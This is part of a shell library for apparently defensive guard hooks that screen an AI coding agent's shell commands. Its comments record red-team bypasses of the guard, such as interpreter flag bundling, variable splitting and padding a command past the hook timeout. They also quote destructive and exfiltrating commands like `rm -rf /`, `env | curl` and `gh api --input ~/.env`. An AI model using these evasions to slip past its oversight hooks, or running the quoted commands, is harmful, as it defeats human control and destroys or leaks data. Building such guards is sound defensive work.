# can't hide the real first word (mirrors peelPrefixWrappers + the CC 2.1.145
# `FOO=bar cmd` auto-approve-bypass fix).
floor_peel() {
  _c="$1"; _i=0
  while [ "$_i" -lt 3 ]; do
    # A wrapper requires a COMMAND after it. `env | curl …` is not a wrapped
    # command, it is a dump piped somewhere — stripping the `env` there erased
    # the evidence the CRED-05 rule exists to see (B7). So the next token must
    # start with something that could begin a command, and it is kept.
    _p="$(printf '%s' "$_c" | sed -E \
      -e 's/^[[:space:]]*[A-Za-z_][A-Za-z0-9_]*=[^[:space:]]+[[:space:]]+//' \
      -e 's/^[[:space:]]*(sudo|env|nohup|command|builtin|exec|stdbuf|nice|ionice)[[:space:]]+([^[:space:]|&;<>)])/\2/' \
      -e 's/^[[:space:]]*timeout[[:space:]]+[0-9]+[smhd]?[[:space:]]+//')"
    [ "$_p" = "$_c" ] && break
    _c="$_p"; _i=$((_i + 1))
  done
  printf '%s' "$_c"
}

# floor_is_executor <cmd> — 0 iff the command hands a (possibly quoted) string
# to an interpreter, so that quoted string is CODE, not data.
# The flag test accepts BUNDLED forms (bash -lc, sh -xc, python3 -Ec): requiring
# -c as its own token let `bash -lc 'curl|sh'` be classified as a non-executor,
# which then had its payload treated as inert data (red-team 2026-07-24, the
# highest-impact bypass — it defeated every pattern for every payload).
# Deliberately PERMISSIVE: this predicate GATES whether the CODE variant is
# scanned at all, so a miss is total — a live payload becomes dropped data.
# Two misses were confirmed (red-team pass 2): an absolute-path interpreter
# (/bin/bash -c) and a flag taking a separate value (zsh -o norc -c). Both are
# fixed by (a) allowing a leading path and (b) accepting the -c/-e/-r flag
# ANYWHERE after the interpreter word rather than as an unbroken flag chain.
# osascript is macOS's only; the Linux forms (python, node, perl) are already listed (harbor#618).
floor_is_executor() {
  floor_ematch "$1" '(^|[^[:alnum:]_])(/[a-zA-Z0-9_./-]*/)?(bash|sh|zsh|dash|ksh|busybox)[[:space:]]+([^[:space:]]+[[:space:]]+)*--?[a-zA-Z-]*c([[:space:]]|=|$)' && return 0
  # trap runs its quoted action as eval runs its line, on the signal or at exit (harbor#1313).
  floor_ematch "$1" '(^|[^[:alnum:]_])(eval|trap|xargs|watch|timeout|nohup|setsid|flock|unshare|chroot|env)([[:space:]]|$)' && return 0
  floor_ematch "$1" '(^|[^[:alnum:]_])find([[:space:]]).*-exec' && return 0
  floor_ematch "$1" '(^|[^[:alnum:]_])(/[a-zA-Z0-9_./-]*/)?(python[0-9.]*|node|nodejs|ruby|perl|php|osascript)[[:space:]]+([^[:space:]]+[[:space:]]+)*--?[a-zA-Z-]*(c|e|r)([[:space:]]|=|$)' && return 0
  floor_ematch "$1" '(^|[^[:alnum:]_])(ssh|awk|make|systemd-run|docker|kubectl)([[:space:]])' && return 0
  # `sed` LEFT THIS LIST (edge pass 2026-08-29). Every other word here hands a
  # string to a shell; sed does not. Its quoted argument is a SED program, and a
  # `|` in one is a delimiter or an alternation — never a pipe. Promoting it to
  # CODE meant `s|rm -rf /|X|` was scanned with shell rules, where the two
  # delimiters read as pipeline boundaries and rm-rf-root.flat fired on an
  # ordinary edit to a file documenting that rule. It blocked twice while this
  # pass was measuring it.
  #
  # NOT A WEAKENING, MEASURED RATHER THAN ARGUED. Both shapes that could have
  # lost cover were run against HEAD and against this file: `sed 's/x/…/e'` and
  # `sed -n 'w <floor surface>'` are allowed BY BOTH, so neither was coverage
  # this removed — they are pre-existing gaps, now recorded in FLOOR.md rather
  # than quietly inherited. The write that IS caught, `sed -i '' 's/a/b/'
  # <surface>`, still blocks after the change, because there the surface is its
  # own operand and the rule reads it from DATA without ever needing CODE.
  #
  # sed reaches a shell through one door, GNU's `e`, so that door keeps the
  # promotion — as a bound on what this file will hand over, not as a claim that
  # the payload behind it is caught today. The first assertions written for this
  # change said it was; running them is what showed otherwise.
  #
  # The `e` test errs toward promoting: a non-word character followed by `e` at a
  # word end covers `s/x/y/e`, `s|x|y|e` and a bare `e cmd`, and costs at most a
  # spurious promotion, which only ever adds a variant to scan.
  floor_ematch "$1" '(^|[^[:alnum:]_])sed([[:space:]])' \
    && floor_ematch "$1" '([^[:alnum:][:space:]]e|(^|[[:space:]])e)([[:space:]]|$)' \
    && return 0
  return 1
}

# floor_bash_targets <cmd> — the newline-joined set of strings that would
# ACTUALLY run. Delegates the shell-aware parse to floor-normalize.awk (see
# that file for the quoting model) and picks the variant by role:
#   • DATA  — quoted ARGUMENTS dropped (inert), word-adjacent quotes kept
#             (c'url' → curl, rm -rf ''/ → rm -rf /)
#   • CODE  — added only when the command is an interpreter, where the quoted
#             argument genuinely is code
#   • SUB   — every substitution body, always
# Executor detection runs on DATA, so a dangerous-looking string inside a
# commit message cannot promote the command to CODE.
# An inherited FLOOR_AWK/FLOOR_MAX_NORM is the same class of undocumented
# kill-switch as FLOOR_GREP: pointing the first at /dev/null or the second at 0
# disables the anti-evasion pre-pass for every guard, and a project-level
# settings.json `env` block can set them (privsec FO-03/04/05). Only a real
# normalizer inside the guard directory is honoured.
_fa="${FLOOR_AWK:-}"
[ -n "$_fa" ] && [ ! -s "$_fa" ] && _fa=""
case "$_fa" in */floor-normalize.awk) ;; *) _fa="" ;; esac
# harbor#813: no dirname fork for a caller that set no DIR.
case "${0:-.}" in */*) _fad="${0%/*}" ;; *) _fad=. ;; esac
FLOOR_AWK="${_fa:-${DIR:-$_fad}/floor-normalize.awk}"

# floor_expand_vars <text> — substitute simple `NAME=value` assignments made
# earlier in the SAME command. Every rule requires the dangerous token to sit
# next to its verb, so splitting it into a variable defeated all of them:
#   F=$HOME/.claude/settings.json; echo {} > $F     (red-team pass 3)
# Bounded to 8 assignments; purely additive (the expanded copy is scanned
# alongside the original, never instead of it).
floor_expand_vars() {
  _t="$1"
  case "$_t" in *=*) ;; *) printf '%s' "$_t"; return 0 ;; esac
  # Assignments, newline-separated. Iterated with `set --` rather than a pipe
  # so the substitutions accumulate in THIS shell (a `while read` pipeline runs
  # in a subshell and every expansion was silently discarded).
  _old="$IFS"; IFS='
'
  # shellcheck disable=SC2086
  set -- $(printf '%s' "$_t" | "$FLOOR_GREP" -oE '[A-Za-z_][A-Za-z0-9_]*=[^[:space:];&|]+' 2>/dev/null | head -8)
  IFS="$_old"
  for _a in "$@"; do
    _n="${_a%%=*}"; _v="${_a#*=}"
    [ -n "$_n" ] || continue
    case "$_v" in *[\\\&\|]*) continue ;; esac   # keep sed's replacement safe
    _t="$(printf '%s' "$_t" | sed "s|\${$_n}|$_v|g; s|\$$_n|$_v|g" 2>/dev/null || printf '%s' "$_t")"
  done
  printf '%s' "$_t"
}

# floor_expand_paths <text> — rewrite every home spelling to the absolute home
# and collapse redundant slashes, so path rules match ONE canonical form.
# Enumerating spellings in each regex kept failing: pass 2 covered `~/` and
# `$HOME`, pass 5's re-anchoring dropped `~user/` (which the shell expands to
# the same directory), and every new rule had to re-list them. Normalizing once
# here is the fix that does not have to be repeated per rule (red-team pass 6).
#
# `/x/../` JOINS `//` HERE, through the shared collapse (harbor#94, P13-fs-02).
# This is the one canonical form every Bash-surface path rule reads — CFG_RE,
# CFG_TOK, CFGDIR_RE, the segment-table args in floor_seg_has, the archive
# destinations — and it stopped one collapse short of the file-tool guard's, so
# `~/Library/../.claude/bin/guard-bash.sh` reached none of them. Fixing it in the
# canonicaliser rather than in the rules is this function's whole purpose: a
# `..` clause added to CFG_RE would have to be added to CFG_TOK and to every
# rule written after it.
floor_expand_paths() {
  _fep="$(printf '%s' "$1" | floor_home_sed 2>/dev/null)" || { printf '%s' "$1"; return 0; }
  # A trailing '/.' or '/..' names a directory as surely as '/../' does: '~/..' is the
  # parent of $HOME (pass 13, P13D-1). Given its slash, the collapse below resolves it.
  case "$_fep" in */.*) _fep="$(printf '%s\n' "$_fep" | sed -e 's|/\.\.$|/../|' -e 's|/\.$|/./|')" ;; esac
  floor_collapse_dots "$_fep"
}

# Above this size the shell-aware normalizer is skipped. Its char loop builds
# strings by concatenation, which awk implements in O(n^2): 10KB takes 85ms but
# 200KB takes 11.7s. A hook that exceeds its timeout is SKIPPED — so padding a
# dangerous command with junk was a fail-OPEN bypass (QA plan R4, measured).
# Oversized payloads fall back to scanning the RAW command: cruder, O(n), and
# fail-toward-BLOCKING — padding now makes a match more likely, not less.
case "${FLOOR_MAX_NORM:-}" in
  ''|*[!0-9]*) FLOOR_MAX_NORM=32768 ;;
  *) [ "$FLOOR_MAX_NORM" -lt 4096 ] && FLOOR_MAX_NORM=32768 ;;
esac

# floor_hd_strip_body <data-line> <raw-cmd> — echo the DATA line with the heredoc BODY
# removed, or the line unchanged when that cannot be done SAFELY (harbor#302).
#
# The false-positive class this exists for: a heredoc body is a document, and the
# FLAT scanners read it as though it were the command. Measured on this box, the
# floor blocked eleven pieces of ordinary work in one session on that basis — a
# commit message quoting a rule name, a ticket body, a probe script, the patch for
# the rule itself — every one of them defeated by writing identical bytes to a file
# instead, which is the tell the ticket names.
#
# THE OPENER LINE IS EVERYTHING BEFORE THE FIRST " ; ", because floor-normalize.awk
# joins logical lines with that separator. That is what makes this decidable here
# and NOT from FLOOR_SEGS: `cat <<HD | sh` puts the shell at segment 2, between the
# opener and the body, with the delimiter still last, so an index walk cannot see
# it. The pipe is plainly visible on the DATA line.
#
# EVERY GUARD RETURNS THE LINE UNCHANGED. There is no path here that emits less
# than today unless all three conditions hold, so the failure mode is the status
# quo rather than a hole.
#
# harbor#784: a TYPED ` ; ` is the same three bytes, so the raw opener line is
# checked too (_floor_hd_line1_clean). <raw> is the command before normalizing.
_floor_hd_line1_clean() { # <raw> -> 0 iff line 1 is one whole heredoc opener line
  _hdr="${1%%
*}"
  # Bounded, so a long opener costs a scan rather than a hook timeout (fail-open).
  [ "${#_hdr}" -le 4096 ] || return 1
  case "$_hdr" in *'<<'*) ;; *) return 1 ;; esac
  # No typed separator, here-string, substitution, group or escape: each can put a
  # ` ; ` into DATA that is not this newline, or carry the command onto line 2.
  case "$_hdr" in *';'*|*'<<<'*|*'|'*|*'&'*|*'('*|*')'*|*'`'*|*\\*) return 1 ;; esac
  # A quote left open carries the command line past the newline. One linear awk
  # pass: a shell walk over 1000 quotes on a 4 KB line took 10 s of CPU.
  case "$_hdr" in *[\"\']*) ;; *) return 0 ;; esac
  printf '%s\n' "$_hdr" | awk '{
    q = ""; n = length($0)
    for (i = 1; i <= n; i++) { c = substr($0, i, 1); if (q == "") { if (c == "\047" || c == "\"") q = c } else if (c == q) q = "" }
    exit (q != "")
  }'
}
floor_hd_strip_body() {
  _hdl="$1"
  case "$_hdl" in *' ; '*) ;; *) printf '%s' "$_hdl"; return 0 ;; esac
  _hdo="${_hdl%% ; *}"
  case "$_hdo" in *'<<'*) ;; *) printf '%s' "$_hdl"; return 0 ;; esac
  # 1 · single simple command. `&&` and `||` are covered by `&` and `|`.
  case "$_hdo" in
    *'|'*|*'&'*|*';'*|*'$('*|*'`'*) printf '%s' "$_hdl"; return 0 ;;
  esac
  # 2 · THE CONSUMER IS ON AN ALLOW-LIST, NOT OFF A DENY-LIST, and that polarity is
  # the whole safety argument. A deny-list of interpreters is a claim about a set
  # you do not control, and the first draft of this proved it: it listed the
  # obvious shells and script engines and still missed five consumers that execute
  # a heredoc body while being single simple commands with no pipeline and no
  # surface name — a remote shell over ssh, a crontab install, an at job, a
  # makefile read from stdin, and a container exec. Each would have had its body
  # hidden from the flat scanners while still running. That is the same failure as
  # the executor word list which killed the previous attempt at this ticket.
  #
  # So: only consumers whose stdin cannot execute and whose purpose is writing a
  # document to a file. Two of them. Anything else keeps being scanned.
  _hdw="${_hdo%% *}"; _hdw="${_hdw##*/}"
  case "$_hdw" in
    cat|tee) ;;
    *) printf '%s' "$_hdl"; return 0 ;;
  esac
  # THERE IS DELIBERATELY NO "A REDIRECT MUST BE PRESENT" CONDITION. A draft had
  # one, requiring `>` on the opener. It cost `tee /tmp/f <<EOF` — which writes to a
  # file through its ARGUMENT, not a redirect — and bought nothing: `cat <<HD` with
  # no redirect prints the body to the transcript and executes none of it, and
  # condition 1 already refuses every pipeline, compound, background and
  # substitution form, so no unclassified construct survives for it to catch.
  # 3 · the opener names no floor surface. Substring, not CFG_RE — see the header.
  case "$_hdo" in
    *.claude*|*settings.json*|*hooks/*|*.git/*|*CLAUDE.md*) printf '%s' "$_hdl"; return 0 ;;
  esac
  # 3b · harbor#784: the first " ; " is the newline after the opener only when the
  # RAW first line is that whole opener. No raw command, no strip.
  _floor_hd_line1_clean "${2:-}" || { printf '%s' "$_hdl"; return 0; }
  # The delimiter, from `<<`, `<<-`, and with the quotes the normalizer already
  # stripped. Taken from the LAST `<<` on the opener so `a <<X` inside a quoted
  # argument cannot shadow the real one.
  _hdd="${_hdo##*<<}"; _hdd="${_hdd#-}"; _hdd="${_hdd%% *}"
  _hdd="$(printf '%s' "$_hdd" | tr -d "\"'")"
  [ -n "$_hdd" ] || { printf '%s' "$_hdl"; return 0; }
  # Walk the " ; "-joined fields: keep the opener, drop until the delimiter field,
  # keep the remainder. A line whose delimiter never appears is UNTERMINATED and is
  # returned unchanged — the conservative reading of a malformed command.
  _hdrest="${_hdl#* ; }"
  _hdkept=""
  _hdfound=0
  while [ -n "$_hdrest" ]; do
    case "$_hdrest" in
      *' ; '*) _hdf="${_hdrest%% ; *}"; _hdrest="${_hdrest#* ; }" ;;
      *)       _hdf="$_hdrest"; _hdrest="" ;;
    esac
    if [ "$_hdfound" = 1 ]; then
      _hdkept="$_hdkept ; $_hdf"
    elif [ "$_hdf" = "$_hdd" ]; then
      _hdfound=1
    fi
  done
  [ "$_hdfound" = 1 ] || { printf '%s' "$_hdl"; return 0; }
  # 4 · THE BODY MUST NAME NO FLOOR SURFACE, and this condition exists to KEEP a
  # decision rather than to close a hole. floor-test:5191 pins "a heredoc into a
  # FILE is live text to the flat rules whatever it spells — pinned as a pair so
  # the find spelling and the direct spelling cannot drift". Measured without this
  # condition, the strip flipped exactly one assertion — "FIND heredoc doc,
  # direct" from rc2 to rc0 — while its paired find spelling kept blocking, because
  # the -exec child is a synthesized segment the ARGV layer still reads. The two
  # spellings would drift, which is what the pair was written to prevent.
  #
  # So a body that names the config directory keeps being read as live text. The
  # false-positive class this ticket is actually about — prose naming a destructive
  # verb, a rule token, a keychain flag — is unaffected, because none of it
  # mentions the config dir.
  #
  # WHAT THIS DELIBERATELY DOES NOT FIX: documentation whose body quotes a path
  # inside the config dir still blocks, and in this repo that is ordinary work.
  # Fixing it means changing the pinned posture, which is a decision and not a
  # patch.
  _hdbody="${_hdl#* ; }"
  case "$_hdbody" in
    *.claude*|*settings.json*|*/hooks/*|*CLAUDE.md*) printf '%s' "$_hdl"; return 0 ;;
  esac
  printf '%s%s' "$_hdo" "$_hdkept"
}

floor_bash_targets() {
  if [ "${#1}" -gt "$FLOOR_MAX_NORM" ]; then
    printf '%s\n' "$1"
    printf '%s\n' "$(floor_expand_paths "$1")"
    return 0
  fi
  [ -f "$FLOOR_AWK" ] || { printf '%s\n' "$1"; return 0; }   # fail-open-ish
  # harbor#805: a heredoc body is not quote-parsed, so neutralize its quotes before the
  # normalizer (which has no heredoc awareness) lets one leak past the terminator.
  _btin="$1"; case "$1" in *'<<'*) _btin="$(floor_hd_literalize_bodies "$1")" ;; esac
  _norm="$(printf '%s' "$_btin" | awk -f "$FLOOR_AWK" 2>/dev/null || true)"
  [ -n "$_norm" ] || { printf '%s\n' "$1"; return 0; }
  _data="$(floor_peel "$(printf '%s\n' "$_norm" | sed -n 's/^DATA://p')")"
  # harbor#302 — a heredoc BODY is a document, so the flat scanners must not read
  # it as the command. Returns the line UNCHANGED unless the opener is a single
  # simple command, its word is not an interpreter, and it names no floor surface.
  _data="$(floor_hd_strip_body "$_data" "$1")"
  printf '%s\n' "$_data"
  # Collapse repeated and dot slashes so "rm -rf //" and "rm -rf /./" read as
  # the root they actually resolve to — the Bash surface had no path
  # normalization at all, unlike the file-path guard (red-team pass 3).
  floor_collapse_dots "$_data"; printf '\n'
  # Expand against the UN-peeled text: floor_peel strips a leading `NAME=value`
  # wrapper, which is exactly the assignment the expansion needs to see.
  _rawdata="$(printf '%s\n' "$_norm" | sed -n 's/^DATA://p')"
  _exp="$(floor_expand_vars "$_rawdata")"
  [ "$_exp" = "$_rawdata" ] || printf '%s\n' "$_exp"
  # Canonical-home variant, so path rules need only the absolute spelling.
  _hp="$(floor_expand_paths "$_exp")"
  [ "$_hp" = "$_exp" ] || printf '%s\n' "$_hp"
  printf '%s\n' "$_norm" | sed -n 's/^SUB://p'
  # EXPD renders substitutions back in place so a rule can see `eval $( … )`
  # adjacency — both handlers erase `$(` from DATA/CODE, which left the
  # fetch-and-execute rules structurally unreachable (red-team pass 4).
  printf '%s\n' "$_norm" | sed -n 's/^EXPD://p'
  # VALU renders each substitution as a guess at its OUTPUT, so an operand that
  # arrives via `$(printf /)` still sits next to its verb. Without it every
  # adjacency-based rule broke at once (red-team pass 8, critical).
  printf '%s\n' "$_norm" | sed -n 's/^VALU://p'
  # FEXEC — find's `-exec`/`-ok` children with `{}` substituted back to the
  # search root (floor-normalize.awk, seg_expand_find). The child is a command
  # find RUNS, so the flat half of the file has to see it too: `find <cfg>/bin
  # -name 'guard-*.sh' -exec cp /tmp/evil {} \;` has no surface next to a
  # mutating verb until the placeholder is resolved, and mutate-onto-surface —
  # which already knows that a destination-position surface is a write and a
  # source-position one is a backup — then answers it with no new rule.
  # ONE LINE PER CHILD, and that is not cosmetic: every flat rule reaches its
  # operand through a `[^;&|]*` span, and a span that could run out of a real
  # operand into a synthesized one would manufacture adjacency that the command
  # does not have. grep is line-oriented, so a line boundary is a wall.
  # The `case` runs first so a command with no find child costs no fork at all —
  # the same discipline floor_seg_cwd_under states: a hook that exceeds its
  # timeout is SKIPPED, so a fork on every call is a fail-open path.
  case "$_norm" in
    *"FEXEC:"*)
      _fx="$(printf '%s\n' "$_norm" | sed -n 's/^FEXEC://p')"
      printf '%s\n' "$_fx"
      _fxe="$(floor_expand_paths "$_fx")"
      [ "$_fxe" = "$_fx" ] || printf '%s\n' "$_fxe" ;;
  esac
  if floor_is_executor "$_data"; then
    floor_peel "$(printf '%s\n' "$_norm" | sed -n 's/^CODE://p')"
    printf '\n'
  fi
}

# ─────────────────────────────────────────────────────────────────────────────
# H2 (harbor#4) — THE PER-SESSION CONTEXT FILE.
#
# floor_session_context — print this session's recorded verdict, or empty.
# floor_engine_stand_down — exit 0 iff a GLOBAL-ENGINE hook must not act here.
#
# ONLY AN EXPLICIT OPT-OUT STANDS THE ENGINE DOWN (harbor#954, D-46). It read
# "anything but a clear `ambient` ⇒ stand down", so a marker alone, a missing
# resolver or a first-ever session all stopped the work log in every marked repo,
# with nothing replacing it. Now the one signal is `worklog: off` at the top level
# of the .agents/config.yaml whose marker floor_in_repo finds, honoured beside
# `context: ambient` too: an owner who wrote it meant it. The session verdict no
# longer decides this; floor_session_context stays for the readers of the file.
floor_session_context() {
  _cx="$(floor_config_dir)/.helm-context"
  _sid="${1:-$(floor_field '.session_id')}"
  [ -n "$_sid" ] || return 0
  case "$_sid" in *[!A-Za-z0-9_-]*) return 0 ;; esac
  [ -f "$_cx/$_sid" ] || return 0
  # head -1, not cat: a reader must not be steered by anything appended below
  # the verdict line.
  head -n 1 "$_cx/$_sid" 2>/dev/null | tr -d '[:space:]' || true
}

floor_engine_stand_down() {
  floor_in_repo || :
  [ -n "$FLOOR_MARKER_DIR" ] || return 1
  _wo="$FLOOR_MARKER_DIR/.agents/config.yaml"
  { [ -f "$_wo" ] && [ ! -L "$_wo" ]; } || return 1
  # The `context:` reader's spelling rules: column 0, quotes and a spaced colon allowed, and a
  # comment needs whitespace before it. YAML 1.1 reads Off and OFF as the same boolean.
  "$FLOOR_GREP" -Eq \
    "^[\"']?worklog[\"']?[[:space:]]*:[[:space:]]*[\"']?[Oo][Ff][Ff][\"']?([[:space:]]+#.*)?[[:space:]]*\$" \
    "$_wo" 2>/dev/null
}

# ─────────────────────────────────────────────────────────────────────────────
# THE SEGMENT-TABLE API (B-rewrite, owner decision 2026-07-25).
#
# A rule written against this asks a question about ARGV — "is some segment
# running `tar` in extract mode with an argument under the config dir?" —
# instead of a question about spelling — "does this string contain `tar`,
# followed within N characters by a dash-prefixed group containing x, followed
# by …". The second question is the one this workstream measured going wrong at
# 60-85% of the rate it went right.
#
# FAIL-OPEN, deliberately and consistently with every other scanner here: if the
# awk is missing, the payload is oversized, or the table is empty, every
# predicate below returns "no match". The un-swallowable layer is B1's
# permissions.deny, which binds the named TOOL and needs no parser at all.
#
#   floor_seg_load "$cmd"                       # once per guard invocation
#   floor_seg_cmd '^(rm|shred)$'                # a segment runs this command
#   floor_seg_has '^tar$' '^-?[a-z]*x' '/\.claude'   # …AND carries these args
#   floor_seg_redir '.' '/\.claude/'            # …writes there via redirection
#
# Every pattern is an ERE matched against a WHOLE token, so `^…$` anchors mean
# what they say. Argument patterns are matched against arguments AND redirect
# targets: a redirect target is an operand of the segment, and `tar -xf p -C
# ~/.claude` and `cat k > ~/.claude/x` are the same concern.
floor_seg_load() { # <cmd>
  FLOOR_SEGS=""
  FLOOR_SEG_CMD="$1"  # harbor#798: the heredoc veto reads the command its table came from
  [ -f "$FLOOR_AWK" ] || return 0
  [ "${#1}" -gt "$FLOOR_MAX_NORM" ] && return 0
  # harbor#805: neutralize heredoc-body quotes so one cannot leak past the terminator (the veto
  # keeps FLOOR_SEG_CMD = the original, so delimiter quoting is still read as written).
  _slin="$1"; case "$1" in *'<<'*) _slin="$(floor_hd_literalize_bodies "$1")" ;; esac
  FLOOR_SEGS="$(printf '%s' "$_slin" | awk -f "$FLOOR_AWK" 2>/dev/null | "$FLOOR_GREP" '^SEG' || true)"
  return 0
}

# floor_seg_degraded — 0 iff floor_seg_load produced NO table, i.e. every
# floor_seg_* rule in the calling guard is silently absent for this call.
#
# WHY A GUARD HAS TO BE ABLE TO ASK THIS (harbor#306). floor_seg_load and
# floor_bash_targets degrade in OPPOSITE directions, and only one of them is
# safe. floor_bash_targets falls back to scanning the RAW command — "cruder,
# O(n), and fail-toward-BLOCKING", as its own note above says. floor_seg_load
# falls back to the empty string, so a segment rule that cannot be evaluated
# reads as a rule that did not match. In a guard carrying BOTH layers
# (guard-bash) the flat layer covers the gap. In a guard whose rules are
# segment-ONLY the whole rule set evaporates with exit 0 and no output.
#
# MEASURED 2026-08-25 against guard-destroy.sh and guard-cloud.sh, whose
# deny-always tiers are segment-only. Three causes, one verdict:
#
#   a command over FLOOR_MAX_NORM  -> SILENT ALLOW on diskutil eraseDisk
#   awk absent from PATH           -> SILENT ALLOW
#   floor-normalize.awk missing    -> SILENT ALLOW
#
# with `guard-bash.sh` DENYING the padded 'rm -rf /' alongside it as the control.
# The first cause needs no missing binary, no missing file and no environment
# override — a trailing comment of 33,000 bytes is enough, and the same padding
# makes a guard-bash match MORE likely. So the deny-always tier of a
# segment-only guard was one long command away from being switched off.
#
# THE PREDICATE DISCRIMINATES, which is the only thing that makes it usable
# (No.2.10). Measured over the ordinary corpus: `ls` 2 segments, `git status` 3,
# `bq query 'select 1'` 4, a three-stage pipeline 9, a heredoc commit 13 — and a
# 30 KB command still 3. Every parseable call yields a non-empty table; only the
# three degraded causes above yield an empty one. An empty table therefore means
# "could not parse", never "nothing to see".
#
# IT IS NOT A RULE AND MUST NOT BECOME ONE. It reports that the argv layer is
# blind for this call; what a guard does about that belongs to the guard, whose
# tier structure knows which of its rules were load-bearing. Deciding here would
# put one posture on every caller, including the ask-tier ones where fail-open is
# the deliberate §2.11 choice.
floor_seg_degraded() { [ -z "${FLOOR_SEGS:-}" ]; }

# _floor_seg_ids <cmd-ERE> — the ids of segments whose command matches.
# NOTE the `if` around every grep. `grep -q` returning 1 as the last command of
# a loop body exits the loop 1 under `set -eu`, which killed the enclosing
# pipeline and silently truncated the B8 manifest (pass 11, critical). The same
# trap is one keystroke away in every function here.
#
# ONE grep over the whole SEGC block, not two processes PER SEGMENT. The first
# cut looped over every segment and forked a sed and a grep for each, so with
# five floor_seg_has calls in guard-bash a 60-line build script took 2.4s
# against 0.23s before, and an 8KB payload took 38s (pass 12, P12-perf-04). That
# is not a comfort issue: a PreToolUse hook that exceeds its timeout is SKIPPED,
# so latency IS a fail-open bypass — padding the command switches the guard off.
_floor_seg_ids() { # <cmd-ERE> [ci]
  # CASE-INSENSITIVITY IS OPT-IN, AND THE BLANKET FORM WAS MEASURED AND REJECTED
  # (harbor#282). The whole flat layer is `-iEq`, so making this `-iE` too looks
  # like the obvious repair for the CRONTAB bypass. It is not: this helper also
  # resolves the shell segments floor_seg_shells_all_named_scripts counts, and one
  # extra case-insensitive match withdraws the harbor#222 exemption.
  #
  # MEASURED over 2,000 real transcript commands: the blanket `-i` flipped exactly
  # one verdict, ALLOW -> BLOCK as pipe-to-shell, and bisecting the payload to
  # seven lines named the trigger — a heredoc commit message carrying
  #
  #     a hardcoded `WIRE_POST='Read|Bash|Grep|WebFetch'`
  #
  # The `|Bash` in that prose became a shell segment with no named script, the
  # exemption failed, and a legitimate `sh <script> | grep` pipeline was refused.
  # That is harbor#277's class, and this repo writes that matcher string into
  # commit messages constantly — so 1-in-2,000 badly understates it for real work.
  #
  # So callers that mean "a command NAME, however spelled" ask for `ci`; callers
  # that COUNT SHELLS must not, or the exemption they feed becomes unreliable.
  _fsci=""; [ "${2:-}" = ci ] && _fsci="-i"
  # The anchors come off by parameter expansion, not $(printf | sed): two fewer processes per call (harbor#264).
  _fsre="${1#^}"; _fsre="${_fsre%\$}"
  "$FLOOR_GREP" $_fsci -E "^SEGC:[0-9]+:$_fsre\$" 2>/dev/null <<FLOOR_SEG_EOF \
    | sed -n 's/^SEGC:\([0-9][0-9]*\):.*/\1/p' | sort -un | tr '\n' ' '
${FLOOR_SEGS:-}
FLOOR_SEG_EOF
}

# _floor_seg_argtab — every segment's arguments and redirect targets, one per line, raw then in
# floor_expand_paths' spelling, in FLOOR_SEG_TAB_ARGS, and the owning segment id of each line in
# FLOOR_SEG_TAB_IDS (FLOOR_SEG_TAB_N lines). Built once per FLOOR_SEGS (guard-bash appends fold rows,
# so the table is keyed on the whole string). Returns 1 when the expansion does not keep one line per
# argument, and floor_seg_has then takes its per-segment loop instead.
_floor_seg_argtab() {
  [ "${FLOOR_SEG_TAB_KEY-x}" = "$FLOOR_SEGS" ] && return "${FLOOR_SEG_TAB_RC:-1}"
  FLOOR_SEG_TAB_KEY="$FLOOR_SEGS"; FLOOR_SEG_TAB_RC=1
  _fta="$(printf '%s\n' "$FLOOR_SEGS" | awk '
    /^SEGA:/ { s = substr($0, 6); p = index(s, ":"); print substr(s, 1, p - 1); print "A" substr(s, p + 1); next }
    /^SEGR:/ { s = substr($0, 6); p = index(s, ":"); r = substr(s, p + 1); q = index(r, ":")
               print substr(s, 1, p - 1); print "A" substr(r, q + 1) }
    END { print "@"; print "A@END@" }')" || return 1
  _fti="$(printf '%s\n' "$_fta" | awk 'NR % 2')"
  _ftr="$(printf '%s\n' "$_fta" | awk 'NR % 2 == 0 { print substr($0, 2) }')"
  _fte="$(floor_expand_paths "$_ftr")"
  _ftn="$(printf '%s\n' "$_ftr" | awk 'END { print NR }')"
  [ "$_ftn" = "$(printf '%s\n' "$_fte" | awk 'END { print NR }')" ] || return 1
  case "$_ftr" in *'@END@') ;; *) return 1 ;; esac
  case "$_fte" in *'@END@') ;; *) return 1 ;; esac
  FLOOR_SEG_TAB_IDS="$_fti
$_fti"
  FLOOR_SEG_TAB_ARGS="$_ftr
$_fte"
  FLOOR_SEG_TAB_N=$((_ftn * 2))
  FLOOR_SEG_TAB_RC=0
  return 0
}

# floor_seg_has <cmd-ERE> [arg-ERE …] — exit 0 iff SOME ONE segment matches the
# command AND carries an argument (or redirect target) for EVERY arg pattern.
# "Some one" matters: the patterns must all hold of the SAME segment, which is
# precisely what a flat scanner cannot express — `tar -tf a.tar; cp x ~/.claude`
# satisfies both halves of the old regex across two unrelated commands.
floor_seg_has() {
  [ -n "${FLOOR_SEGS:-}" ] || return 1
  _scre="$1"; shift
  # P13E-2: the per-segment loop below forked ~6 times per matching segment per call, so 2000 padded
  # 'rm a' lines took the guard past the hook timeout, and a timed-out hook fails OPEN. The table path
  # asks each arg pattern ONCE over every segment's arguments, with the same grep and the same pattern;
  # the loop stays only as the fallback when that table cannot be built consistently.
  if [ "$#" -gt 0 ] && _floor_seg_argtab; then
    _sids="$(_floor_seg_ids "$_scre" ci)"
    [ -n "$_sids" ] || return 1
    for _sre in "$@"; do
      _sids="$( { printf '%s\n' "$_sids"; printf '%s\n' "$FLOOR_SEG_TAB_IDS"
                  printf '%s\n' "$FLOOR_SEG_TAB_ARGS" | "$FLOOR_GREP" -nE -- "$_sre" 2>/dev/null | cut -d: -f1; } \
                | awk -v n="$FLOOR_SEG_TAB_N" 'NR == 1 { k = split($0, c, " "); for (i = 1; i <= k; i++) C[c[i]] = 1; next }
                    NR <= n + 1 { ID[NR - 1] = $0; next }
                    { i = ID[$0 + 0]; if (i in C && !(i in O)) { O[i] = 1; printf "%s ", i } }')"
      [ -n "$_sids" ] || return 1
    done
    return 0
  fi
  # `ci` (harbor#282, PR #283 review). Every caller of this helper is asking "does
  # some segment RUN this command", and on a case-insensitive filesystem GCLOUD is
  # gcloud. Measured before widening: `gcloud projects delete` DENIED and `GCLOUD
  # projects delete` ALLOWED; same for `bq rm`, `git reset --hard`, `git clean
  # -fdx`, `diskutil eraseDisk` and `gh api --input ~/.env`. Those guards are
  # argv-only by design — they emit permissionDecision rather than a flat block —
  # so unlike guard-bash's rm/tar sites they had no case-insensitive twin to fall
  # back on, and the gap was a complete bypass of an ask AND of two denies.
  for _sid in $(_floor_seg_ids "$_scre" ci); do
